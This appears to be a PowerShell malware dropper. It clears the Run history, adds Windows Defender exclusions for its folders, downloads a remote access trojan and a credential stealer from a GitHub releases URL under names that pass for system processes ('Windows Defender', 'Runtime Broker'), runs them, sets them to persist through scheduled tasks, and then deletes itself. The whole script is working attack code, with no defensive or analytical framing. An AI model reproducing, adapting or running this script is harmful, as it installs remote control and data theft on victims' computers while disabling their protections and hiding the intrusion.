# Assigning variable for user folder.
Set-Location "~"
$dir = "$pwd"
$user = $dir.split("\")[2]

# Creating and entering the directory.
mkdir -Force "$dir\AppData\Roaming\Microsoft\Windows\Windows Defender"
Set-Location "$dir\AppData\Roaming\Microsoft\Windows\Windows Defender"

# Clearing run history.
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

# Adding Windows Defender Exclusions.
Add-MpPreference -ExclusionPath "$dir\AppData\Roaming\Microsoft\Windows\Windows Defender"
Add-MpPreference -ExclusionPath "$dir\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Add-MpPreference -ExclusionPath "$dir\AppData\Local\Temp"

# Downloading and running the RAT.
Invoke-WebRequest -URI "https://github.com/HussHemAG/TinyPico/releases/download/1.0/Windows.Defender.exe" -OutFile "Windows Defender.exe"
& ".\Windows Defender.exe"

# Adding the RAT to startup.
Invoke-WebRequest -URI "https://github.com/HussHemAG/TinyPico/releases/download/1.0/Windows.Defender.Startup.xml" -OutFile "Windows Defender Startup.xml"
(Get-Content "Windows Defender Startup.xml") -replace "USERNAME", $user | Set-Content "Windows Defender Startup.xml"
(Get-Content "Windows Defender Startup.xml") -replace "SYSNAME", "$(whoami)" | Set-Content "Windows Defender Startup.xml"
Register-ScheduledTask -Xml (get-content "$dir\AppData\Roaming\Microsoft\Windows\Windows Defender\Windows Defender Startup.xml" | out-string) -TaskName "Windows Defender" -TaskPath "\" -Force -User $(whoami)
Remove-Item "Windows Defender Startup.xml" -Force

# Downloading and running the Stealer.
Invoke-WebRequest -URI "https://github.com/HussHemAG/TinyPico/releases/download/1.0/Runtime.Broker.exe" -OutFile "Runtime Broker.exe"
& ".\Runtime Broker.exe"

# Adding the Stealer to startup.
Invoke-WebRequest -URI "https://github.com/HussHemAG/TinyPico/releases/download/1.0/Runtime.Broker.Startup.xml" -OutFile "Runtime Broker Startup.xml"
(Get-Content "Runtime Broker Startup.xml") -replace "USERNAME", $user | Set-Content "Runtime Broker Startup.xml"
(Get-Content "Runtime Broker Startup.xml") -replace "SYSNAME", "$(whoami)" | Set-Content "Runtime Broker Startup.xml"
Register-ScheduledTask -Xml (get-content "$dir\AppData\Roaming\Microsoft\Windows\Windows Defender\Runtime Broker Startup.xml" | out-string) -TaskName "Runtime Broker" -TaskPath "\" -Force -User $(whoami)
Remove-Item "Runtime Broker Startup.xml" -Force

# Deleting the script.
Remove-Item $PSCommandPath -Force

# Closing powershell.
exit
